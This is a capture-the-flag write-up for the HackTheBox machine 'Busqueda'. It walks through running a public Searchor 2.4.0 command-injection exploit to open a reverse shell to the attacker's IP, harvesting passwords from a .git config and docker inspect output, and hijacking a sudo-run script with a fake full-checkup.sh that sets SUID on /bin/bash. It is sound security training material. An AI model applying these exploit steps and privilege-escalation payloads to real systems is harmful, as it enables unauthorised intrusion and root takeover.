 
## Reconnaissance

### nmap 
```
nmap -sC -sV -oN busquesda_light 10.10.11.208
```


![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Enum%20-%20nmap.png)

### Web Service 

- Visit Web Top Page
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Enum%20-%20web%20top%20page.png)

- Find the clue about web framework - Searchor 2.4.0
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Enum%20-%20web%20framework%20-%20Searchor.png)

- Research for Searchor 2.4.0
```
searchsploit searchor
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Enum%20-%20searchor%20exploit%20search.png)

- Research from internet 
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Enum%20-%20Searchor%20research.png)

- Find some exploit codes for searchor
1. [Searchor_2.4.0_RCE_Python](https://github.com/twisted007/Searchor_2.4.0_RCE_Python)
2. [Searchor-2.4.0-POC-Exploit](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)
3. [Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Enum%20-%20Find%20exploit%20code%20for%20searchor.png)

![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Enum%20-%20Detail%20of%20exploit%20code%20for%20searchor.png)


## Exploit 

- Try the exploit code 
- The message shows the usage for this RCE code
```
python searchor-2_4_0_RCE.py
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Exploit%20-%20Execute%20searchor%20RCE.png)

- Following the usage guide to execute it again
```
python searchor-2_4_0_RCE.py searcher.htb 10.10.16.107 1337
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Exploit%20-%20Execute%20exploit%20code%20for%20searchor%20RCE.png)

- Check nc listener, it will get reverse shell
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Exploit%20-%20nc%20get%20rev%20shell.png)

- Confirm the current user, its 'svc'
```
id 
whoami
```
- Get user flag
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Exploit%20-%20user%20flag.png)


## Privilege Escalation 

- After get the permission of victim
- I tried to check the sudo permission for current user first.
```
sudo -l
```
- It'll ask password.
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20check%20sudo%20permission.png)

- Enum the website directory 
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20webroot%20name.png)

- Check the webroot content, I found a hidden file '.git'
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20webroot%20content.png)

- Check git directory, I find a config file.
- In this config file, it includes the credential.
```
cody / jh1usoih2bkjaspwe92
```
- And there is also have shown that the subdomain website for this credential 
- Add it to hosts file 
```
gitea.searcher.htb
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20git%20config%20content.png)

- Access the subdomain 
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20subdomain%20web%20content.png)

- Login with cody credential
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20login%20gitea%20page%20with%20cody%20creds.png)

- It's a git repository service 
- Check repository in cody's credential, only have Searcher website's source code.
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Check%20cody%20repo.png)

- But I also find the Searcher web site is created by administrator
- So there should exist another user named 'administrator'
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Find%20administrator%20user%20for%20gitea%20service%20in%20cody%20account.png)

- Execute the sudo list permission command again 
```
sudo -l
```
- Using cody's credential
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Try%20cody%20credential%20on%20svc%20to%20read%20sudo%20permission.png)

![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20sudo%20permission%20content.png)

- Then follow the result, execute system-checkup.py like sudo permission for user svc
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Confirm%20the%20usage%20of%20system-checkup.png)

- Check the content of /opt/scripts 
```
ls /opt/scripts
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Content%20of%20scripts%20directory.png)

- Check the code of system-checkup.py --> Failed (Permission denied)
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Try%20to%20check%20the%20content%20of%20system-checkup%20python.png)

- It's not able to analysis the system-checkup code.
- So, I need to just follow the usage guide to execute this python file then analysis the action of this scripts.
- It's kind of black box test.
- Follow the usage guide, execute docker process 
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Execute%20docker%20ps%20on%20through%20system-checkup.png)

- 2 active docker container
- Try to execute docker inspect 
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20docker-inspect%20execute.png)

- It will show another usage guide, I will need to provide 2 parameter 
	1. format
	2. container name
- I think container name can be get from docker-ps result.
- But I have no idea what kind of format I should provide.
- Research and find [this article](https://docs.docker.com/engine/reference/commandline/inspect/)
> Docker inspect provides detailed information on constructs controlled by Docker.
> By default, `docker inspect` will render results in a JSON array.
- According to the guideline, I can use '{{json .Config}}' as json format/
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Check%20the%20usage%20about%20docker%20inspect.png)

- Execute to check 1st docker container
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a5b33fb5a
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Execute%20docker%20inspect%20on%20docker%20ID%20through%20system-checkup.png)

- Find the following password 
```
MYSQL_ROOT_PASSWORD = jI86kGUuj87guWr3RyF
MYSQL USER = gitea
MYSSQL_PASSWORD = yuiu1hoiu4i5ho1uh
```
- Execute to check 2nd docker container
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Execute%20docker%20inspect%20on%20docker%20ID%20through%20system-checkup%202.png)

- Find the following password 
```
GITEA_database_NAME = gitea
GITEA_database_PASSWD = yuiu1hoiu4i5ho1uh
```
- Try different combination to login gitea as administrator 
```
1. administrator / yuiu1hoiu4i5ho1uh
2. administrator / jI86kGUuj87guWr3RyF
```
- The 1st one will success
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Access%20administrator%20user%20for%20gitea%20service.png)

- Check the code in administrator 
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Check%20%20repo%20%20in%20administrator%20user.png)

- Read the content of system-checkup.py
```
#!/bin/bash

import subprocess

import sys

  

actions = ['full-checkup', 'docker-ps','docker-inspect']

  

def run_command(arg_list):

r = subprocess.run(arg_list, capture_output=True)

if r.stderr:

output = r.stderr.decode()

else:

output = r.stdout.decode()

  

return output

  
  

def process_action(action):

if action == 'docker-inspect':

try:

_format = sys.argv[2]

if len(_format) == 0:

print(f"Format can't be empty")

exit(1)

container = sys.argv[3]

arg_list = ['docker', 'inspect', '--format', _format, container]

print(run_command(arg_list))

except IndexError:

print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")

exit(1)

except Exception as e:

print('Something went wrong')

exit(1)

elif action == 'docker-ps':

try:

arg_list = ['docker', 'ps']

print(run_command(arg_list))

except:

print('Something went wrong')

exit(1)

  

elif action == 'full-checkup':

try:

arg_list = ['./full-checkup.sh']

print(run_command(arg_list))

print('[+] Done!')

except:

print('Something went wrong')

exit(1)

  

if __name__ == '__main__':

  

try:

action = sys.argv[1]

if action in actions:

process_action(action)

else:

raise IndexError

  

except IndexError:

print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')

print('')

print(' docker-ps : List running docker containers')

print(' docker-inspect : Inpect a certain docker container')

print(' full-checkup : Run a full system checkup')

print('')

exit(1)
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Check%20content%20of%20system-checkup%20-1.png)

![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Check%20content%20of%20system-checkup%20-2.png)

- The valuable to do escalate is full-checkup 
- full-checkup function will execute shell file 
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20full%20check%20function%20in%20system-checkup.png)

- Try to execute full-checkup
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Execute%20full%20docker%20checkup%20through%20system-checkup.png)

- Check the detail of full-check.sh in repo
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20full-checkup%20shell%20content.png)

- So, the original full-checkup shell script will check the container status and the information of all container.
### Organize all the information 
- Until now, I have the following information
	- Get Cody's credential for gitea repo site from .git config file 
	- The same credential can login to svc with sudo permission
	- According to sudo permission result, I can execute some python file(system-checkup.py) with root 
	- This python file allow to execute some docker command and a shell script.
	- Through the docker command (docker inspect) I get other credential related to gitea repo, use these creds, I can login gitea with administrator
	- In gitea as administrator user, I can check the source code of system-checkup.py, and I found that the full-checkup option will execute shell script.
	- So, it means I can use root user to execute shell script.
- Then with above conclusion, I should create a fake shell script which also named as 'full-checkup.sh'
- Then using system-checkup.py to execute it.
### Escalation step
- Create fake full-checkup shell 
- This shell script will add suid permission to /bin/bash
```
#!/bin/bash
chmod +s /bin/bash
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Content%20of%20fake%20full-checkup.png)

- Execute fake full-checkup script by system-checkup.py
```
python3 /opt/scripts/system-checkup.py full-checkup
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Execute%20escalate%20%20code%20by%20system-checkup%20on%20fake%20full-checkup.png)

- After executing, check the current permission setting on /bin/bash 
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Check%20the%20suid%20on%20bash%20file.png)

- Using bash with privilege option to escalate the root permission  
```
bash -p
```
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20bash%20privilege%20mode%20to%20escalate%20permission.png)

- Check  user permission, I can find the euid with root permission get
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20Check%20root%20permission%20in%20id.png)

- Get root flag
![image](https://github.com/popyue/HackTheBox/blob/main/machine/Busqueda/BusquedaImage/Privilege%20-%20root%20flag.png)


## Reference 

### Writup up

- [Busqueda 1](https://www.bughunter.me/ctf-write-ups/hackthebox-busqueda-write-up/)
- [Busqueda 2](https://blog.csdn.net/qq_58869808/article/details/130050438)
- [Busqueda 3](https://www.google.com/search?q=busqueda+htb&rlz=1C5CHFA_enTW1055TW1055&oq=busqueda+&gs_lcrp=EgZjaHJvbWUqBwgBEAAYgAQyBggAEEUYOTIHCAEQABiABDIHCAIQABiABDIHCAMQABiABDIHCAQQABiABDIHCAUQABiABDIHCAYQABiABDIHCAcQABiABDIHCAgQABiABDIHCAkQABiABNIBCDQ5NzZqMGo3qAIAsAIA&sourceid=chrome&ie=UTF-8)
- [Busqueda 4](https://blog.213.se/busqueda-hackthebox/)
### Searchor

- [Searchor](https://github.com/ArjunSharda/Searchor)

#### Searchor Exploit 

1. [Searchor_2.4.0_RCE_Python](https://github.com/twisted007/Searchor_2.4.0_RCE_Python)
2. [Searchor-2.4.0-POC-Exploit](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)
3. [Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

### Docker 

- [docker inspect](https://docs.docker.com/engine/reference/commandline/inspect/)
- [Docker inspect 命令](https://www.runoob.com/docker/docker-inspect-command.html)

###### tags: `HackTheBox`